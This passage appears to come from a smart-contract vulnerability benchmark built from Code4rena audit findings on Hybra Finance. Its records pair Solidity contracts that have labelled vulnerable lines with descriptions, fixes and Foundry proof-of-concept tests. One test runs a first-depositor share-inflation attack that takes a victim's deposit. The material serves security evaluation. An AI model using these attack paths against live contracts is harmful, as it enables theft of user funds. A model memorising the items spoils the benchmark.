protocolFeeManager;\r\n    /// @inheritdoc ICLFactory\r\n    address public override protocolFeeModule;\r\n    /// @inheritdoc ICLFactory\r\n    uint24 public override defaultProtocolFee;\r\n\r\n    mapping(int24 => uint24) public override tickSpacingToFee;\r\n    /// @inheritdoc ICLFactory\r\n    mapping(address => mapping(address => mapping(int24 => address))) public override getPool;\r\n    /// @dev Used in VotingEscrow to determine if a contract is a valid pool\r\n    mapping(address => bool) private _isPool;\r\n    /// @inheritdoc ICLFactory\r\n    address[] public override allPools;\r\n\r\n    int24[] private _tickSpacings;\r\n\r\n    constructor(address _poolImplementation) {\r\n        owner = msg.sender;\r\n        swapFeeManager = msg.sender;\r\n        unstakedFeeManager = msg.sender;\r\n        protocolFeeManager = msg.sender;\r\n        poolImplementation = _poolImplementation;\r\n        defaultUnstakedFee = 100_000;\r\n        defaultProtocolFee = 250_000;\r\n        emit OwnerChanged(address(0), msg.sender);\r\n        emit SwapFeeManagerChanged(address(0), msg.sender);\r\n        emit UnstakedFeeManagerChanged(address(0), msg.sender);\r\n        emit DefaultUnstakedFeeChanged(0, 100_000);\r\n\r\n        enableTickSpacing(1, 100);\r\n        enableTickSpacing(50, 500);\r\n        enableTickSpacing(100, 500);\r\n        enableTickSpacing(200, 3_000);\r\n        enableTickSpacing(2_000, 10_000);\r\n    }\r\n\r\n    function setGaugeManager(address _gaugeManager) external {\r\n        require(msg.sender == owner);\r\n        gaugeManager = IGaugeManager(_gaugeManager);\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function createPool(address tokenA, address tokenB, int24 tickSpacing, uint160 sqrtPriceX96)\r\n        external\r\n        override\r\n        returns (address pool)\r\n    {\r\n        require(tokenA != tokenB);\r\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        require(token0 != address(0));\r\n        require(tickSpacingToFee[tickSpacing] != 0);\r\n        require(getPool[token0][token1][tickSpacing] == address(0));\r\n        pool = Clones.cloneDeterministic({\r\n            master: poolImplementation,\r\n            salt: keccak256(abi.encode(token0, token1, tickSpacing))\r\n        });\r\n        CLPool(pool).initialize({\r\n            _factory: address(this),\r\n            _token0: token0,\r\n            _token1: token1,\r\n            _tickSpacing: tickSpacing,\r\n            _gaugeManager: address(gaugeManager),\r\n            _sqrtPriceX96: sqrtPriceX96\r\n        });\r\n        allPools.push(pool);\r\n        _isPool[pool] = true;\r\n        getPool[token0][token1][tickSpacing] = pool;\r\n        // populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses\r\n        getPool[token1][token0][tickSpacing] = pool;\r\n        emit PoolCreated(token0, token1, tickSpacing, pool);\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function setOwner(address _owner) external override {\r\n        address cachedOwner = owner;\r\n        require(msg.sender == cachedOwner);\r\n        require(_owner != address(0));\r\n        emit OwnerChanged(cachedOwner, _owner);\r\n        owner = _owner;\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function setSwapFeeManager(address _swapFeeManager) external override {\r\n        address cachedSwapFeeManager = swapFeeManager;\r\n        require(msg.sender == cachedSwapFeeManager);\r\n        require(_swapFeeManager != address(0));\r\n        swapFeeManager = _swapFeeManager;\r\n        emit SwapFeeManagerChanged(cachedSwapFeeManager, _swapFeeManager);\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function setUnstakedFeeManager(address _unstakedFeeManager) external override {\r\n        address cachedUnstakedFeeManager = unstakedFeeManager;\r\n        require(msg.sender == cachedUnstakedFeeManager);\r\n        require(_unstakedFeeManager != address(0));\r\n        unstakedFeeManager = _unstakedFeeManager;\r\n        emit UnstakedFeeManagerChanged(cachedUnstakedFeeManager, _unstakedFeeManager);\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function setSwapFeeModule(address _swapFeeModule) external override {\r\n        require(msg.sender == swapFeeManager);\r\n        require(_swapFeeModule != address(0));\r\n        address oldFeeModule = swapFeeModule;\r\n        swapFeeModule = _swapFeeModule;\r\n        emit SwapFeeModuleChanged(oldFeeModule, _swapFeeModule);\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function setUnstakedFeeModule(address _unstakedFeeModule) external override {\r\n        require(msg.sender == unstakedFeeManager);\r\n        require(_unstakedFeeModule != address(0));\r\n        address oldFeeModule = unstakedFeeModule;\r\n        unstakedFeeModule = _unstakedFeeModule;\r\n        emit UnstakedFeeModuleChanged(oldFeeModule, _unstakedFeeModule);\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function setDefaultUnstakedFee(uint24 _defaultUnstakedFee) external override {\r\n        require(msg.sender == unstakedFeeManager);\r\n        require(_defaultUnstakedFee <= 500_000);\r\n        uint24 oldUnstakedFee = defaultUnstakedFee;\r\n        defaultUnstakedFee = _defaultUnstakedFee;\r\n        emit DefaultUnstakedFeeChanged(oldUnstakedFee, _defaultUnstakedFee);\r\n    }\r\n\r\n\r\n    function setProtocolFeeModule(address _protocolFeeModule) external override {\r\n        require(msg.sender == protocolFeeManager);\r\n        require(_protocolFeeModule != address(0));\r\n        protocolFeeModule = _protocolFeeModule;\r\n    }\r\n\r\n    function setProtocolFeeManager(address _protocolFeeManager) external override {\r\n        require(msg.sender == protocolFeeManager);\r\n        require(_protocolFeeManager != address(0));\r\n        protocolFeeManager = _protocolFeeManager;\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function getSwapFee(address pool) external view override returns (uint24) {\r\n        if (swapFeeModule != address(0)) {\r\n            (bool success, bytes memory data) = swapFeeModule.excessivelySafeStaticCall(\r\n                200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool)\r\n            );\r\n            if (success) {\r\n                uint24 fee = abi.decode(data, (uint24));\r\n                if (fee <= 100_000) {\r\n                    return fee;\r\n                }\r\n            }\r\n        }\r\n        return tickSpacingToFee[CLPool(pool).tickSpacing()];\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function getUnstakedFee(address pool) external view override returns (uint24) {\r\n        \r\n        if (!gaugeManager.isGaugeAliveForPool(pool)) {\r\n            return 0;\r\n        }\r\n        if (unstakedFeeModule != address(0)) {\r\n            (bool success, bytes memory data) = unstakedFeeModule.excessivelySafeStaticCall(\r\n                200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool)\r\n            );\r\n            if (success) {\r\n                uint24 fee = abi.decode(data, (uint24));\r\n                if (fee <= 1_000_000) {\r\n                    return fee;\r\n                }\r\n            }\r\n        }\r\n        return defaultUnstakedFee;\r\n    }\r\n\r\n    function getProtocolFee(address pool) external view override returns (uint24) {\r\n        // if the gauge is alive, return 0, protocol fee is only for inactive gauges\r\n        if (gaugeManager.isGaugeAliveForPool(pool)) {\r\n            return 0;\r\n        }\r\n\r\n        if (protocolFeeModule != address(0)) {\r\n            (bool success, bytes memory data) = protocolFeeModule.excessivelySafeStaticCall(\r\n                200_000, 32, abi.encodeWithSelector(IFeeModule.getFee.selector, pool)\r\n            );\r\n            if (success) {\r\n                uint24 fee = abi.decode(data, (uint24));\r\n                if (fee <= 500_000) {\r\n                    return fee;\r\n                }\r\n            }\r\n        }\r\n        return defaultProtocolFee;\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function enableTickSpacing(int24 tickSpacing, uint24 fee) public override {\r\n        require(msg.sender == owner);\r\n        require(fee > 0 && fee <= 100_000);\r\n        // tick spacing is capped at 16384 to prevent the situation where tickSpacing is so large that\r\n        // TickBitmap#nextInitializedTickWithinOneWord overflows int24 container from a valid tick\r\n        // 16384 ticks represents a >5x price change with ticks of 1 bips\r\n        require(tickSpacing > 0 && tickSpacing < 16384);\r\n        require(tickSpacingToFee[tickSpacing] == 0);\r\n\r\n        tickSpacingToFee[tickSpacing] = fee;\r\n        _tickSpacings.push(tickSpacing);\r\n        emit TickSpacingEnabled(tickSpacing, fee);\r\n    }\r\n\r\n    function collectAllProtocolFees() external  {\r\n        require(msg.sender == owner);\r\n\r\n        for (uint256 i = 0; i < allPools.length; i++) {\r\n            CLPool(allPools[i]).collectProtocolFees(msg.sender);\r\n        }\r\n    }\r\n\r\n    function collectProtocolFees(address pool) external returns (uint128 amount0, uint128 amount1) {\r\n        require(msg.sender == owner);\r\n        (amount0, amount1) = CLPool(pool).collectProtocolFees(msg.sender);\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function tickSpacings() external view override returns (int24[] memory) {\r\n        return _tickSpacings;\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function allPoolsLength() external view override returns (uint256) {\r\n        return allPools.length;\r\n    }\r\n\r\n    /// @inheritdoc ICLFactory\r\n    function isPool(address pool) external view override returns (bool) {\r\n        return _isPool[pool];\r\n    }\r\n}",
            "vulnerable_lines": [
                176,
                177,
                178,
                179,
                180,
                181,
                182,
                183,
                184,
                185,
                186,
                187,
                188,
                189
            ],
            "vulnerable_functions": [
                "getSwapFee"
            ]
        },
        "context_files": [],
        "call_flow": "Governance.setCustomFee() -> DynamicSwapFeeModule.getFee() (>10%) -> CLFactory.getSwapFee() -> returns default fee",
        "context_hint": "The factory silently clamps dynamic fees above 10% to a low default, misleading governance about effective fee rates.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M02",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-02",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Users emergency withdrawing will lose all past accrued rewards",
        "finding_description": "in the `GaugeV2` contract, if the contract was emergency activated, users calling `emergencyWithdraw()` will lose all past accrued rewards that didn’t have `updateReward()` called on it previously for a user to earn rewards, he gets his mappings updated here modifier updateReward(address account) { rewardPerTokenStored = rewardPerToken(); lastUpdateTime = lastTimeRewardApplicable(); if (account != address(0)) { rewards[account] = earned(account); userRewardPerTokenPaid[account] = rewardPerTokenStored; } _; } as we see above, rewards mapping is registered as the return data from `earned()`, and when we look at it we see function earned(address account) public view returns (uint256) { rewards[account] + _balanceOf(account) * (rewardPerToken() - userRewardPerTokenPaid[account]) / 1e18; } we see that it returns old rewards + current balance of the user multiplied by the rewardPerToken (abstractly) so what happen will be as follows: 1. User stake 100e18 tokens 2. emergency activated 3. he had already earnt before the emergency 10e18 tokens not registered on his rewards mapping since he didn’t call deposit/withdraw/getRewards to update his rewards 4. call emergencyWithdraw and his balance now is 0. 5. now earned() function return 0 rewards since his balance is 0 * rewardPerToken = 0 also the left-off rewards tokens are stuck in the contract forever. Impact: Loss of rewards for users and stuck reward tokens in the contract",
        "attack_scenario": "function test_emergencyWithdraw_strandsRewardsAndBurnsUserAccrual() external { vm.startPrank(address(this)); // Use HYBR both as staking TOKEN and rewardToken for simplicity // We have HYBR minted to this test from setup_InitMinter() uint256 initialHybr = hybr.balanceOf(address(this)); assertGt(initialHybr, 0, \"expected HYBR from initial mint\"); // Deploy GaugeV2 GaugeV2 gauge = new GaugeV2( address(hybr), address(rewardHybr), address(votingEscrow), address(hybr), address(this), address(0), address(0), false ); // Stake HYBR uint256 stakeAmount = 100 ether; hybr.approve(address(gauge), type(uint256).max); gauge.deposit(stakeAmount); // Fund rewards uint256 rewardAmount = 1_000 ether; hybr.approve(address(gauge), rewardAmount); gauge.notifyRewardAmount(address(hybr), rewardAmount); // Accrue some rewards vm.warp(block.timestamp + 7 days / 14); uint256 accruedBefore = gauge.earned(address(this)); assertGt(accruedBefore, 0, \"accrued must be > 0 before emergencyWithdraw\"); // Enable emergency and withdraw gauge.activateEmergencyMode(); gauge.emergencyWithdraw(); uint256 accruedAfter = gauge.earned(address(this)); assertEq(accruedAfter, 0, \"accrued should be zero after emergencyWithdraw\"); uint256 stuckRewards = hybr.balanceOf(address(gauge)); assertGt(stuckRewards, 0, \"reward tokens remain stuck in gauge\"); vm.stopPrank(); }",
        "fix_description": "Add the `updateReward` modifier to the `emergencyWithdraw()` call",
        "primary_file": {
            "path": "ve33/contracts/GaugeV2.sol",
            "content": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.13;\r\n\r\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\r\n\r\nimport './interfaces/IPair.sol';\r\nimport './interfaces/IBribe.sol';\r\nimport \"./libraries/Math.sol\";\r\n\r\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\r\nimport './interfaces/IRHYBR.sol';\r\ninterface IRewarder {\r\n    function onReward(\r\n        address user,\r\n        address recipient,\r\n        uint256 userBalance\r\n    ) external;\r\n}\r\n\r\n\r\ncontract GaugeV2 is ReentrancyGuard, Ownable {\r\n\r\n    using SafeERC20 for IERC20;\r\n\r\n    bool public immutable isForPair;\r\n    bool public emergency;\r\n\r\n\r\n    IERC20 public immutable rewardToken;\r\n    IERC20 public immutable TOKEN;\r\n    address public immutable rHYBR;\r\n    address public VE;\r\n    address public DISTRIBUTION;\r\n    address public gaugeRewarder;\r\n    address public internal_bribe;\r\n    address public external_bribe;\r\n\r\n    uint256 public DURATION;\r\n    uint256 internal _periodFinish;\r\n    uint256 public rewardRate;\r\n    uint256 public lastUpdateTime;\r\n    uint256 public rewardPerTokenStored;\r\n\r\n   \r\n\r\n    mapping(address => uint256) public userRewardPerTokenPaid;\r\n    mapping(address => uint256) public rewards;\r\n\r\n    uint256 internal _totalSupply;\r\n    mapping(address => uint256) internal _balances;\r\n    mapping(address => uint256) public maturityTime;\r\n\r\n    event RewardAdded(uint256 reward);\r\n    event Deposit(address indexed user, uint256 amount);\r\n    event Withdraw(address indexed user, uint256 amount);\r\n    event Harvest(address indexed user, uint256 reward);\r\n\r\n    event ClaimFees(address indexed from, uint256 claimed0, uint256 claimed1);\r\n    event EmergencyActivated(address indexed gauge, uint256 timestamp);\r\n    event EmergencyDeactivated(address indexed gauge, uint256 timestamp);\r\n\r\n    modifier updateReward(address account) {\r\n        rewardPerTokenStored = rewardPerToken();\r\n        lastUpdateTime = lastTimeRewardApplicable();\r\n        if (account != address(0)) {\r\n            rewards[account] = earned(account);\r\n            userRewardPerTokenPaid[account] = rewardPerTokenStored;\r\n        }\r\n        _;\r\n    }\r\n\r\n    modifier onlyDistribution() {\r\n        require(msg.sender == DISTRIBUTION, \"NA\");\r\n        _;\r\n    }\r\n\r\n  \r\n\r\n  \r\n\r\n    modifier isNotEmergency() {\r\n        require(emergency == false, \"EMER\");\r\n        _;\r\n    }\r\n\r\n    constructor(address _rewardToken,address _rHYBR,address _ve,address _token,address _distribution, address _internal_bribe, address _external_bribe, bool _isForPair) {\r\n        rewardToken = IERC20(_rewardToken);     // main reward\r\n        rHYBR = _rHYBR;\r\n        VE = _ve;                               // vested\r\n        TOKEN = IERC20(_token);                 // underlying (LP)\r\n        DISTRIBUTION = _distribution;           // distro address (GaugeManager)\r\n        DURATION = HybraTimeLibrary.WEEK;                   \r\n\r\n        internal_bribe = _internal_bribe;       // lp fees goes here\r\n        external_bribe = _external_bribe;       // bribe fees goes here\r\n\r\n\r\n        isForPair = _isForPair;                 // pair boolean, if false no claim_fees\r\n\r\n        emergency = false;                      // emergency flag\r\n\r\n    }\r\n\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    ONLY OWNER\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    ///@notice set distribution address (should be GaugeManager)\r\n    function setDistribution(address _distribution) external onlyOwner {\r\n        require(_distribution != address(0), \"ZA\");\r\n        require(_distribution != DISTRIBUTION, \"SAME_ADDR\");\r\n        DISTRIBUTION = _distribution;\r\n    }\r\n\r\n    ///@notice set gauge rewarder address\r\n    function setGaugeRewarder(address _gaugeRewarder) external onlyOwner {\r\n        require(_gaugeRewarder != gaugeRewarder, \"SAME_ADDR\");\r\n        gaugeRewarder = _gaugeRewarder;\r\n    }\r\n\r\n\r\n    ///@notice set new internal bribe contract (where to send fees)\r\n    function setInternalBribe(address _int) external onlyOwner {\r\n        require(_int >= address(0), \"ZA\");\r\n        internal_bribe = _int;\r\n    }\r\n\r\n    function activateEmergencyMode() external onlyOwner {\r\n        require(emergency == false, \"EMER\");\r\n        emergency = true;\r\n        emit EmergencyActivated(address(this), block.timestamp);\r\n    }\r\n\r\n    function stopEmergencyMode() external onlyOwner {\r\n\r\n        require(emergency == true,\"EMER\");\r\n\r\n        emergency = false;\r\n        emit EmergencyDeactivated(address(this), block.timestamp);\r\n    }\r\n\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    VIEW FUNCTIONS\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n    ///@notice total supply held\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    ///@notice balance of a user\r\n    function balanceOf(address account) external view returns (uint256) {\r\n        return _balanceOf(account);\r\n    }\r\n\r\n    function _balanceOf(address account) internal view returns (uint256) {\r\n       \r\n        return _balances[account];\r\n    }\r\n\r\n    ///@notice last time reward\r\n    function lastTimeRewardApplicable() public view returns (uint256) {\r\n        return Math.min(block.timestamp, _periodFinish);\r\n    }\r\n\r\n    ///@notice  reward for a sinle token\r\n    function rewardPerToken() public view returns (uint256) {\r\n        if (_totalSupply == 0) {\r\n            return rewardPerTokenStored;\r\n        } else {\r\n            return rewardPerTokenStored + (lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18 / _totalSupply; \r\n        }\r\n    }\r\n\r\n    ///@notice see earned rewards for user\r\n    function earned(address account) public view returns (uint256) {\r\n        return rewards[account] + _balanceOf(account) * (rewardPerToken() - userRewardPerTokenPaid[account]) / 1e18;  \r\n    }\r\n\r\n    ///@notice get total reward for the duration\r\n    function rewardForDuration() external view returns (uint256) {\r\n        return rewardRate * DURATION;\r\n    }\r\n\r\n    function periodFinish() external view returns (uint256) {\r\n        return _periodFinish;\r\n    }\r\n\r\n\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    USER INTERACTION\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n\r\n\r\n    // send whole liquidity as additional param\r\n\r\n\r\n    ///@notice deposit all TOKEN of msg.sender\r\n    function depositAll() external {\r\n        _deposit(TOKEN.balanceOf(msg.sender), msg.sender);\r\n    }\r\n\r\n    ///@notice deposit amount TOKEN\r\n    function deposit(uint256 amount) external {\r\n        _deposit(amount, msg.sender);\r\n    }\r\n\r\n    ///@notice deposit internal\r\n    function _deposit(uint256 amount, address account) internal nonReentrant isNotEmergency updateReward(account) {\r\n        require(amount > 0, \"ZV\");\r\n\r\n        _balances[account] = _balances[account] + amount;\r\n        _totalSupply = _totalSupply + amount;\r\n        if (address(gaugeRewarder) != address(0)) {\r\n            IRewarder(gaugeRewarder).onReward(account, account, _balanceOf(account));\r\n        }\r\n\r\n        TOKEN.safeTransferFrom(account, address(this), amount);\r\n\r\n        emit Deposit(account, amount);\r\n    }\r\n\r\n    ///@notice withdraw all token\r\n    function withdrawAll() external {\r\n        _withdraw(_balanceOf(msg.sender));\r\n    }\r\n\r\n    ///@notice withdraw a certain amount of TOKEN\r\n    function withdraw(uint256 amount) external {\r\n        _withdraw(amount);\r\n    }\r\n\r\n    ///@notice withdraw internal\r\n    function _withdraw(uint256 amount) internal nonReentrant isNotEmergency updateReward(msg.sender) {\r\n        require(amount > 0, \"ZV\");\r\n        require(_balanceOf(msg.sender) > 0, \"ZV\");\r\n        require(block.timestamp >= maturityTime[msg.sender], \"!MATURE\");\r\n\r\n        _totalSupply = _totalSupply - amount;\r\n        _balances[msg.sender] = _balances[msg.sender] - amount;\r\n\r\n        if (address(gaugeRewarder) != address(0)) {\r\n            IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender,_balanceOf(msg.sender));\r\n        }\r\n\r\n        TOKEN.safeTransfer(msg.sender, amount);\r\n\r\n        emit Withdraw(msg.sender, amount);\r\n    }\r\n\r\n    function emergencyWithdraw() external nonReentrant {\r\n        require(emergency, \"EMER\");\r\n        uint256 _amount = _balanceOf(msg.sender);\r\n        require(_amount > 0, \"ZV\");\r\n        _totalSupply = _totalSupply - _amount;\r\n\r\n        _balances[msg.sender] = 0;\r\n   \r\n\r\n        TOKEN.safeTransfer(msg.sender, _amount);\r\n        emit Withdraw(msg.sender, _amount);\r\n    }\r\n\r\n    function emergencyWithdrawAmount(uint256 _amount) external nonReentrant {\r\n\r\n        require(emergency, \"EMER\");\r\n        _totalSupply = _totalSupply - _amount;\r\n\r\n        _balances[msg.sender] = _balances[msg.sender] - _amount;\r\n\r\n        TOKEN.safeTransfer(msg.sender, _amount);\r\n        emit Withdraw(msg.sender, _amount);\r\n    }\r\n\r\n  \r\n\r\n    ///@notice withdraw all TOKEN and harvest rewardToken\r\n    function withdrawAllAndHarvest(uint8 _redeemType) external {\r\n        _withdraw(_balanceOf(msg.sender));\r\n        getReward(_redeemType);\r\n    }\r\n\r\n \r\n    ///@notice User harvest function called from distribution (GaugeManager allows harvest on multiple gauges)\r\n    function getReward(address _user, uint8 _redeemType) public nonReentrant onlyDistribution updateReward(_user) {\r\n        uint256 reward = rewards[_user];\r\n        if (reward > 0) {\r\n            rewards[_user] = 0;\r\n            IERC20(rewardToken).safeApprove(rHYBR, reward);\r\n            IRHYBR(rHYBR).depostionEmissionsToken(reward);\r\n            IRHYBR(rHYBR).redeemFor(reward, _redeemType, _user);\r\n            emit Harvest(_user, reward);\r\n        }\r\n\r\n        if (gaugeRewarder != address(0)) {\r\n            IRewarder(gaugeRewarder).onReward(_user, _user, _balanceOf(_user));\r\n        }\r\n    }\r\n\r\n    ///@notice User harvest function\r\n    function getReward(uint8 _redeemType) public nonReentrant updateReward(msg.sender) {\r\n        uint256 reward = rewards[msg.sender];\r\n        if (reward > 0) {\r\n            rewards[msg.sender] = 0;\r\n            IERC20(rewardToken).safeApprove(rHYBR, reward);\r\n            IRHYBR(rHYBR).depostionEmissionsToken(reward);\r\n            IRHYBR(rHYBR).redeemFor(reward, _redeemType, msg.sender);\r\n            emit Harvest(msg.sender, reward);\r\n        }\r\n\r\n        if (gaugeRewarder != address(0)) {\r\n            IRewarder(gaugeRewarder).onReward(msg.sender, msg.sender, _balanceOf(msg.sender));\r\n        }\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n    /* -----------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n                                    DISTRIBUTION\r\n    --------------------------------------------------------------------------------\r\n    --------------------------------------------------------------------------------\r\n    ----------------------------------------------------------------------------- */\r\n\r\n\r\n    /// @dev Receive rewards from distribution\r\n\r\n    function notifyRewardAmount(address token, uint256 reward) external nonReentrant isNotEmergency onlyDistribution updateReward(address(0)) {\r\n        require(token == address(rewardToken), \"IA\");\r\n        rewardToken.safeTransferFrom(DISTRIBUTION, address(this), reward);\r\n\r\n        if (block.timestamp >= _periodFinish) {\r\n            rewardRate = reward / DURATION;\r\n        } else {\r\n            uint256 remaining = _periodFinish - block.timestamp;\r\n            uint256 leftover = remaining * rewardRate;\r\n            rewardRate = (reward + leftover) / DURATION;\r\n        }\r\n\r\n        // Ensure the provided reward amount is not more than the balance in the contract.\r\n        // This keeps the reward rate in the right range, preventing overflows due to\r\n        // very high values of rewardRate in the earned and rewardsPerToken functions;\r\n        // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\r\n        uint256 balance = rewardToken.balanceOf(address(this));\r\n        require(rewardRate <= balance / DURATION, \"REWARD_HIGH\");\r\n\r\n        lastUpdateTime = block.timestamp;\r\n        _periodFinish = block.timestamp + DURATION;\r\n        emit RewardAdded(reward);\r\n    }\r\n\r\n\r\n    function claimFees() external nonReentrant returns (uint256 claimed0, uint256 claimed1) {\r\n        return _claimFees();\r\n    }\r\n\r\n     function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\r\n        if (!isForPair) {\r\n            return (0, 0);\r\n        }\r\n        address _token = address(TOKEN);\r\n        (claimed0, claimed1) = IPair(_token).claimFees();\r\n        if (claimed0 > 0 || claimed1 > 0) {\r\n\r\n            uint256 _fees0 = claimed0;\r\n            uint256 _fees1 = claimed1;\r\n\r\n            (address _token0, address _token1) = IPair(_token).tokens();\r\n\r\n            if (_fees0  > 0) {\r\n                IERC20(_token0).safeApprove(internal_bribe, 0);\r\n                IERC20(_token0).safeApprove(internal_bribe, _fees0);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\r\n            } \r\n            if (_fees1  > 0) {\r\n                IERC20(_token1).safeApprove(internal_bribe, 0);\r\n                IERC20(_token1).safeApprove(internal_bribe, _fees1);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\r\n            } \r\n            emit ClaimFees(msg.sender, claimed0, claimed1);\r\n        }\r\n    }\r\n\r\n  \r\n}",
            "vulnerable_lines": [
                270,
                271,
                272,
                273,
                274,
                275,
                276,
                277,
                278,
                279,
                280,
                281
            ],
            "vulnerable_functions": [
                "emergencyWithdraw",
                "updateReward",
                "earned"
            ]
        },
        "context_files": [],
        "call_flow": "User.deposit() -> notifyRewardAmount() -> warp time -> activateEmergencyMode() -> emergencyWithdraw() -> earned() returns 0",
        "context_hint": "Emergency withdraw skips reward update, burning unclaimed rewards and leaving tokens stuck in the gauge.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M03",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-03",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 3,
        "context_level": "single_file",
        "finding_title": "First depositor attack possible through multiple attack paths because the deposit function does not check 0 shares received",
        "finding_description": "The gHYBR contract is just another veNFT position holder from the perspective of votingEscrow contract, while the gHYBR contract acts as a vault. And the deposit does not ensure that we mint at least one gHYBR share. This can lead to a condition where the first depositor attacks another user. Example: - Alice deposits dust shares, 1 share : 1 asset - Alice donates 1000e18 assets before Bob deposits, through deposit_for, and he increased the ratio by 1 shares : 1000e18 assets - Bob deposits 100e18 assets, the shares calculation goes 100e18 * 1 / 1000e18 and rounds down to 0 - Receives 0 shares - All bob’s deposit is captured by Alice’s shares - Bob deposits 100e18 assets and receives 0 shares - Alice has 1 share worth 1000e18 + 100e18(bob's) assets The entry points the attacker can use to perform this attack are: 1. The votingEscrow contract allows anyone to deposit assets for any position through its public deposit_for(uint _tokenId, uint _value) external nonreentrant function. 2. The receivePenaltyReward function in GovernanceHYBR contract lacks access control, which allows an attacker to donate to increase totalAssets. 3. Attacker can utilize multiSplit through withdraw, by first depositing 1000:1000 and withdrawing so that the leftover is 1:1 ratio dust. Impact: Alice captures all of Bob’s deposits.",
        "attack_scenario": "function test_submissionValidity() external { // first depositor attack address alice = makeAddr(\"alice\"); address bob = makeAddr(\"bob\"); vm.startPrank(address(minter)); hybr.mint(alice, 2000e18); hybr.mint(bob, 100e18); vm.stopPrank(); vm.startPrank(alice); hybr.approve(address(gHybr), type(uint).max); gHybr.deposit(2, alice); hybr.transfer(address(gHybr), 1000e18); // alice transfers 1000 HYBR to gHYBR gHybr.receivePenaltyReward(1000e18); // alice donates 1000 through the receivePenaltyReward function vm.stopPrank(); // bob deposits vm.startPrank(bob); hybr.approve(address(gHybr), 100e18); gHybr.deposit(100e18, bob); vm.stopPrank(); console.log(\"alice's shares: \", gHybr.balanceOf(alice)); console.log(\"bob's shares: \", gHybr.balanceOf(bob)); console.log(\"gHYBR total assets: \", gHybr.totalAssets()); } Run this test and see the result: - Alice’s shares: 2 - Bob’s shares: 0 - gHYBR total assets: 1100000000000000000002 Alice captures all of Bob’s deposits.",
        "fix_description": "Require `shares > 0` in `deposit`; add access control to `receivePenaltyReward`.",
        "primary_file": {
            "path": "ve33/contracts/GovernanceHYBR.sol",
